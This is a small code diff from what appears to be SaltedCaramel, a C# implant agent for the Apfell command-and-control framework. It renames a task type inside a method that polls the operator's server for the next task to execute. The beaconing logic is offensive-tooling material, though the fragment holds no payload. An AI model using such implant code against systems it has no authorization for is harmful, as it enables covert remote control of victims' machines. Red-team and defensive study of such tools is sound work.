@@ -180,7 +180,7 @@ namespace SaltedCaramel
         /// Check Apfell endpoint for new task
         /// </summary>
         /// <returns>CaramelTask with the next task to execute</returns>
-        public SCTaskObject CheckTasking()
+        public SCTask CheckTasking()
         {
             string taskEndpoint = this.endpoint + "tasks/callback/" + this.callbackId + "/nextTask";
             try // Try block for checking tasks (throws if retries exceeded)
@@ -189,7 +189,7 @@ namespace SaltedCaramel
                 {
                     try // Try block for HTTP request
                     {
-                        SCTaskObject task = JsonConvert.DeserializeObject<SCTaskObject>(HTTP.Get(taskEndpoint));
+                        SCTask task = JsonConvert.DeserializeObject<SCTask>(HTTP.Get(taskEndpoint));
                         retry = 0;
                         if (task.command != "none")
                             Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
